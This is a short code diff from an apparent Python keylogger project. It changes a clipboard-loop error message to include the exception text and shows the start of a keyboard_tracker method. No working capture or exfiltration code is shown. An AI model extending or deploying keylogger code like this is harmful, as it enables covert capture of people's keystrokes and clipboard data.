@@ -57,7 +57,7 @@ class Keylogger:
                 # Wait for 0.5 seconds
                 time.sleep(SLEEP)
             except Exception as err:
-                print("Error with clipboard")
+                print("Error with clipboard" + str(err))
 
     def keyboard_tracker(self, event):
         key = event.name
